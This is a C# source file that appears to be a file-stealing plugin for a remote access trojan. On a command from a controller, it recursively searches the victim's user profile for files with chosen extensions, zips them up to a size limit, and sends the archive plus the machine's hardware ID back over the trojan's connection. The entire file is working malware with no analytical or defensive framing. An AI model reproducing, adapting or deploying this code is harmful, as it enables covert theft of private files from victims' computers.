using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Ionic.Zip;
using MessagePackLib.MessagePack;

namespace Plugin
{
    public static class Packet
    {
        public static readonly string ZipfilePath = Path.GetTempFileName() + ".zip";
        private static long SizeLimit = 5000000; //5MB
        private static long CurrentSize;
        private static readonly List<string> Extensions = new List<string>();

        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "fileSearcher":
                    {
                        SizeLimit = unpack_msgpack.ForcePathObject("SizeLimit").AsInteger;
                        Debug.WriteLine(SizeLimit + "MB");
                        foreach (var s in unpack_msgpack.ForcePathObject("Extensions").AsString.Split(' '))
                            if (!string.IsNullOrEmpty(s))
                                Extensions.Add(s.Trim().ToLower());
                        Debug.WriteLine(string.Join(", ", Extensions));
                        Search();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static List<string> GetAllAccessibleFiles(string rootPath, List<string> alreadyFound = null)
        {
            if (alreadyFound == null)
                alreadyFound = new List<string>();
            var di = new DirectoryInfo(rootPath);
            var dirs = di.EnumerateDirectories();
            foreach (var dir in dirs)
                if (!((dir.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden))
                    alreadyFound = GetAllAccessibleFiles(dir.FullName, alreadyFound);

            var files = Directory.GetFiles(rootPath);
            foreach (var file in files)
            {
                if (CurrentSize >= SizeLimit) break;
                if (Extensions.Contains(Path.GetExtension(file).ToLower()))
                {
                    alreadyFound.Add(file);
                    CurrentSize = CurrentSize + new FileInfo(file).Length;
                }
            }

            return alreadyFound;
        }

        private static void Search()
        {
            try
            {
                var files = GetAllAccessibleFiles(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

                if (files.Count == 0)
                {
                    Log("Nothing found.");
                }
                else
                {
                    if (Save(files))
                    {
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                        msgpack.ForcePathObject("ZipFile").SetAsBytes(File.ReadAllBytes(ZipfilePath));
                        Connection.Send(msgpack.Encode2Bytes());
                    }
                }
            }
            catch
            {
            }
        }

        private static bool Save(List<string> files)
        {
            try
            {
                if (File.Exists(ZipfilePath)) File.Delete(ZipfilePath);
                Thread.Sleep(500);
                using (var zip = new ZipFile())
                {
                    foreach (var file in files) zip.AddFile(file);
                    zip.Save(ZipfilePath);
                }

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static void Log(string message)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Logs";
            msgpack.ForcePathObject("Message").AsString = message;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }
}